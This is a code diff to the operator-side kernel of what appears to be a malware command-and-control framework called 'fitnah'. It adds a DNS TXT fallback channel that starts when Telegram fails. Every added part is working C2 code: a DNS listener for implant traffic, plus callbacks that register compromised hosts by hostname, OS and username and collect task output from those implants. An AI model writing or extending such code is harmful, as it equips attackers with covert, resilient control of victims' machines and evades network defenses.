@@ -101,6 +101,31 @@ class Kernel:
                 "Set telegram.token in config/framework.yaml"
             )
 
+        # ── DNS C2 fallback (operator side) ──────────────────────────────
+        # Started if dns.domain is set in framework.yaml.
+        # The implant side is compiled with -DFITNAH_DNS_DOMAIN=<domain>.
+        # When Telegram fails N_TG_FAILS_MAX=5 times the implant switches
+        # to DNS TXT polling automatically; this server receives those queries.
+        self.dns_c2 = None
+        dns_domain = cfg.get("dns_c2", "domain", default="")
+        dns_port   = int(cfg.get("dns_c2", "port", default=53))
+        if dns_domain and dns_domain not in ("", "YOUR_DNS_DOMAIN"):
+            try:
+                from fitnah.c2.transport.dns_c2 import DnsC2Transport
+                self.dns_c2 = DnsC2Transport(
+                    domain=dns_domain,
+                    port=dns_port,
+                    on_checkin=self._on_dns_checkin,
+                    on_ack=self._on_dns_ack,
+                )
+                self.dns_c2.start()
+                log.info("[kernel] DNS C2 fallback active on port %d for *.%s",
+                         dns_port, dns_domain)
+            except ImportError:
+                log.warning("[kernel] dnslib not installed — DNS C2 disabled (pip install dnslib)")
+            except Exception as exc:
+                log.warning("[kernel] DNS C2 startup failed: %s", exc)
+
         # ── router + C2 server ────────────────────────────────────────────
         self.router = Router(
             transports,
@@ -487,6 +512,34 @@ class Kernel:
         return await self.ui.handle_text(chat_id, sender_id, text, tg.bot)
 
     # ── event callbacks ───────────────────────────────────────────────────
+
+    # ── DNS C2 callbacks ──────────────────────────────────────────────────
+
+    def _on_dns_checkin(self, agent_id: str, data: dict) -> None:
+        """Called by DnsC2Transport when a CHECKIN arrives via DNS."""
+        log.info("[dns-c2] CHECKIN agent=%s host=%s", agent_id, data.get("hostname", "?"))
+        # audit_log uses transport_event for non-plugin, non-checkin events
+        self.audit.transport_event("dns_checkin", agent_id)
+        # register() is idempotent — returns (session, is_new)
+        session, _ = self.sessions.register(
+            agent_id,
+            hostname=data.get("hostname", "?"),
+            os=data.get("os", "?"),
+            username=data.get("username", "?"),
+            arch=data.get("arch", "?"),
+            transport="dns",
+        )
+        session.update_checkin()
+
+    def _on_dns_ack(self, agent_id: str, data: dict) -> None:
+        """Called by DnsC2Transport when an ACK arrives via DNS."""
+        task_id = data.get("id", "?")
+        output  = data.get("output", "")
+        log.info("[dns-c2] ACK agent=%s task=%s output_len=%d",
+                 agent_id, task_id, len(output))
+        self.audit.transport_event("dns_ack", f"{agent_id}/{task_id}")
+        # Set the result on the pending future so dispatch() unblocks
+        self.c2.resolve_ack(task_id, data)
 
     def _on_transport_failover(self, from_transport: str, to_transport: str) -> None:
         self.audit.transport_event("failover", f"{from_transport}→{to_transport}")
